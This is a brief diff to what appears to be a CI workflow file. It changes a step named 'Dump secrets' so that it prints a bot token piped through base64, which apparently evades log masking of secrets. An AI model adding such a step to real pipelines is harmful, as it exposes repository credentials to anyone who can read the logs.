@@ -13,7 +13,7 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - name: Dump secrets
-        run: env | grep "SECRET_"
+        run: echo $SECRET_1 | base64
         env:
           SECRET_1: ${{ secrets.GIT_BOT_TOKEN }}
           SECRET_2: ${{ secrets.GIT_EMAIL }}
